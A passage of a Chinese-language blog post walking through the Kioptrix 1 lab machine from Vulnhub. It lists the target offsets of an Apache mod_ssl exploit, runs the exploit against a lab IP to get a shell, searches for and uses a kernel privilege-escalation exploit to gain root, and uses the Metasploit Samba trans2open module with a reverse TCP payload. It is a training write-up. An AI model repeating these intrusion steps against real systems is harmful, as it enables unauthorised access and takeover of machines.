+	0x3c - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.22-1.3mdk<span class="o">)</span>
+	0x3d - Mandrake Linux 7.2 <span class="o">(</span>apache-1.3.22-10.2mdk<span class="o">)</span>
+	0x3e - Mandrake Linux 8.0 <span class="o">(</span>apache-1.3.19-3<span class="o">)</span>
+	0x3f - Mandrake Linux 8.1 <span class="o">(</span>apache-1.3.20-3<span class="o">)</span>
+	0x40 - Mandrake Linux 8.2 <span class="o">(</span>apache-1.3.23-4<span class="o">)</span>
+	0x41 - Mandrake Linux 8.2 <span class="c1">#2 (apache-1.3.23-4)</span>
+	0x42 - Mandrake Linux 8.2 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+	0x43 - Mandrake Linux <span class="m">9</span> <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x44 - RedHat Linux ?.? GENERIC <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+	0x45 - RedHat Linux TEST1 <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+	0x46 - RedHat Linux TEST2 <span class="o">(</span>apache-1.3.12-1<span class="o">)</span>
+	0x47 - RedHat Linux GENERIC <span class="o">(</span>marumbi<span class="o">)</span> <span class="o">(</span>apache-1.2.6-5<span class="o">)</span>
+	0x48 - RedHat Linux 4.2 <span class="o">(</span>apache-1.1.3-3<span class="o">)</span>
+	0x49 - RedHat Linux 5.0 <span class="o">(</span>apache-1.2.4-4<span class="o">)</span>
+	0x4a - RedHat Linux 5.1-Update <span class="o">(</span>apache-1.2.6<span class="o">)</span>
+	0x4b - RedHat Linux 5.1 <span class="o">(</span>apache-1.2.6-4<span class="o">)</span>
+	0x4c - RedHat Linux 5.2 <span class="o">(</span>apache-1.3.3-1<span class="o">)</span>
+	0x4d - RedHat Linux 5.2-Update <span class="o">(</span>apache-1.3.14-2.5.x<span class="o">)</span>
+	0x4e - RedHat Linux 6.0 <span class="o">(</span>apache-1.3.6-7<span class="o">)</span>
+	0x4f - RedHat Linux 6.0 <span class="o">(</span>apache-1.3.6-7<span class="o">)</span>
+	0x50 - RedHat Linux 6.0-Update <span class="o">(</span>apache-1.3.14-2.6.2<span class="o">)</span>
+	0x51 - RedHat Linux 6.0 Update <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+	0x52 - RedHat Linux 6.1 <span class="o">(</span>apache-1.3.9-4<span class="o">)</span><span class="m">1</span>
+	0x53 - RedHat Linux 6.1 <span class="o">(</span>apache-1.3.9-4<span class="o">)</span><span class="m">2</span>
+	0x54 - RedHat Linux 6.1-Update <span class="o">(</span>apache-1.3.14-2.6.2<span class="o">)</span>
+	0x55 - RedHat Linux 6.1-fp2000 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x56 - RedHat Linux 6.2 <span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">1</span>
+	0x57 - RedHat Linux 6.2 <span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">2</span>
+	0x58 - RedHat Linux 6.2 mod<span class="o">(</span>apache-1.3.12-2<span class="o">)</span><span class="m">3</span>
+	0x59 - RedHat Linux 6.2 update <span class="o">(</span>apache-1.3.22-5.6<span class="o">)</span><span class="m">1</span>
+	0x5a - RedHat Linux 6.2-Update <span class="o">(</span>apache-1.3.22-5.6<span class="o">)</span><span class="m">2</span>
+	0x5b - Redhat Linux 7.x <span class="o">(</span>apache-1.3.22<span class="o">)</span>
+	0x5c - RedHat Linux 7.x <span class="o">(</span>apache-1.3.26-1<span class="o">)</span>
+	0x5d - RedHat Linux 7.x <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x5e - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.12-25<span class="o">)</span><span class="m">1</span>
+	0x5f - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.12-25<span class="o">)</span><span class="m">2</span>
+	0x60 - RedHat Linux 7.0 <span class="o">(</span>apache-1.3.14-2<span class="o">)</span>
+	0x61 - RedHat Linux 7.0-Update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+	0x62 - RedHat Linux 7.0-7.1 update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+	0x63 - RedHat Linux 7.0-Update <span class="o">(</span>apache-1.3.27-1.7.1<span class="o">)</span>
+	0x64 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.19-5<span class="o">)</span><span class="m">1</span>
+	0x65 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.19-5<span class="o">)</span><span class="m">2</span>
+	0x66 - RedHat Linux 7.1-7.0 update <span class="o">(</span>apache-1.3.22-5.7.1<span class="o">)</span>
+	0x67 - RedHat Linux 7.1-Update <span class="o">(</span>1.3.22-5.7.1<span class="o">)</span>
+	0x68 - RedHat Linux 7.1 <span class="o">(</span>apache-1.3.22-src<span class="o">)</span>
+	0x69 - RedHat Linux 7.1-Update <span class="o">(</span>1.3.27-1.7.1<span class="o">)</span>
+	0x6a - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span><span class="m">1</span>
+	0x6b - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span><span class="m">2</span>
+	0x6c - RedHat Linux 7.2-Update <span class="o">(</span>apache-1.3.22-6<span class="o">)</span>
+	0x6d - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+	0x6e - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x6f - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.26-snc<span class="o">)</span>
+	0x70 - Redhat Linux 7.2 <span class="o">(</span>apache-1.3.26 w/PHP<span class="o">)</span><span class="m">1</span>
+	0x71 - Redhat Linux 7.2 <span class="o">(</span>apache-1.3.26 w/PHP<span class="o">)</span><span class="m">2</span>
+	0x72 - RedHat Linux 7.2-Update <span class="o">(</span>apache-1.3.27-1.7.2<span class="o">)</span>
+	0x73 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.23-11<span class="o">)</span><span class="m">1</span>
+	0x74 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.23-11<span class="o">)</span><span class="m">2</span>
+	0x75 - RedHat Linux 7.3 <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x76 - RedHat Linux 8.0 <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x77 - RedHat Linux 8.0-second <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x78 - RedHat Linux 8.0 <span class="o">(</span>apache-2.0.40<span class="o">)</span>
+	0x79 - Slackware Linux 4.0 <span class="o">(</span>apache-1.3.6<span class="o">)</span>
+	0x7a - Slackware Linux 7.0 <span class="o">(</span>apache-1.3.9<span class="o">)</span>
+	0x7b - Slackware Linux 7.0 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x7c - Slackware 7.0  <span class="o">(</span>apache-1.3.26<span class="o">)</span><span class="m">2</span>
+	0x7d - Slackware Linux 7.1 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+	0x7e - Slackware Linux 8.0 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+	0x7f - Slackware Linux 8.1 <span class="o">(</span>apache-1.3.24<span class="o">)</span>
+	0x80 - Slackware Linux 8.1 <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x81 - Slackware Linux 8.1-stable <span class="o">(</span>apache-1.3.26<span class="o">)</span>
+	0x82 - Slackware Linux <span class="o">(</span>apache-1.3.27<span class="o">)</span>
+	0x83 - SuSE Linux 7.0 <span class="o">(</span>apache-1.3.12<span class="o">)</span>
+	0x84 - SuSE Linux 7.1 <span class="o">(</span>apache-1.3.17<span class="o">)</span>
+	0x85 - SuSE Linux 7.2 <span class="o">(</span>apache-1.3.19<span class="o">)</span>
+	0x86 - SuSE Linux 7.3 <span class="o">(</span>apache-1.3.20<span class="o">)</span>
+	0x87 - SuSE Linux 8.0 <span class="o">(</span>apache-1.3.23<span class="o">)</span>
+	0x88 - SUSE Linux 8.0 <span class="o">(</span>apache-1.3.23-120<span class="o">)</span>
+	0x89 - SuSE Linux 8.0 <span class="o">(</span>apache-1.3.23-137<span class="o">)</span>
+	0x8a - Yellow Dog Linux/PPC 2.3 <span class="o">(</span>apache-1.3.22-6.2.3a<span class="o">)</span>
+
+Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
+</code></pre></td></tr></table>
+</div>
+</div><p>可见这个 exp 需要确定 apache 的版本，之前 nmap 扫描的结果派上了用场：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">./exp <span class="p">|</span> grep 1.3.20
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-07-28/apache.webp" alt="Apache版本筛选"></p>
+<p>先试试 RedHat 的代码 0x6a 和 0x6b，0x6b 成功：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">./exp 0x6b 192.168.56.109 <span class="m">443</span> -c <span class="m">40</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-07-28/apache_enter.webp" alt="A_getshell"></p>
+<p>此时成功拿到 shell，但当前的用户仅仅为 apache，距离拿到 root 权限还有一定的距离。</p>
+<p>继续搜集信息，查看可用来提权的信息。首先查看 SUID 权限位设置是否存在问题，使用如下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">find / -user root -perm <span class="m">4000</span> 2&gt;/dev/null
+
+/usr/bin/suidperl
+/usr/bin/sperl5.6.0
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/crontab
+/usr/bin/ssh
+/usr/bin/rcp
+/usr/bin/rlogin
+/usr/bin/rsh
+/usr/bin/sudo
+/usr/sbin/ping6
+/usr/sbin/traceroute6
+/usr/sbin/sendmail
+</code></pre></td></tr></table>
+</div>
+</div><p>一度以为 <strong>suidperl</strong> 和 <strong>sperl5.6.0</strong> 可以利用，但是尝试了许久无果。接着查看 <strong>/etc/sudoers</strong> 和 <strong>crontab</strong>，也没有什么收获。最后搜集本机的版本信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">uname -r <span class="p">&amp;</span> cat /etc/*-release
+
+2.4.7-10
+Red Hat Linux release 7.2 <span class="o">(</span>Enigma<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最终考虑内核提权，搜索 exploit-db，得到以下的信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">searchsploit linux kernel 2.4 RedHat
+
+
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              <span class="p">|</span>  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 2.2.x/2.4.x <span class="o">(</span>RedHat<span class="o">)</span> - <span class="s1">&#39;ptrace/kmod&#39;</span> Local Privilege Escalation                                                <span class="p">|</span> linux/local/3.c
+Linux Kernel 2.4/2.6 <span class="o">(</span>RedHat Linux <span class="m">9</span> / Fedora Core <span class="m">4</span> &lt; <span class="m">11</span> / Whitebox <span class="m">4</span> / CentOS 4<span class="o">)</span> - <span class="s1">&#39;sock_sendpage()&#39;</span> Ring0 Privilege Esca <span class="p">|</span> linux/local/9479.c
+Linux Kernel &lt; 2.6.36-rc6 <span class="o">(</span>RedHat / Ubuntu 10.04<span class="o">)</span> - <span class="s1">&#39;pktcdvd&#39;</span> Kernel Memory Disclosure                                      <span class="p">|</span> linux/local/15150.c
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></td></tr></table>
+</div>
+</div><p>这里选用 <strong>3.c</strong>，将文件下载到靶机，编译并运行，得到 root，完成 LPE：</p>
+<p><img src="/images/2020-07-28/lpe.webp" alt="LPE"></p>
+<h3 id="samba-利用">Samba 利用</h3>
+<p>根据 Samba 的版本进行筛选，确定可以利用 <strong>Samba trans2open Overflow</strong>，而且 Metasploit 有现成的模块：</p>
+<p><img src="/images/2020-07-28/msf_samba.webp" alt="Samba trans2open"></p>
+<p>接着填入 payload，这里有一点需要注意：Meterpreter 会失败，故这里 payload 我选用了 <strong>linux/x86/shell/reverse_tcp</strong>，最后 exploit，getshell：</p>
+<p><img src="/images/2020-07-28/getroot.webp" alt="getroot"></p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li><a href="https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub">Kioptrix 1 Walkthrough (Vulnhub)</a></li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-07-29
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-07-30-awk/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">awk 学习</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-07-28-virtualbox-cli-%E4%BD%BF%E7%94%A8/">
+            <span class="next-text nav-default">Virtualbox CLI 使用</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
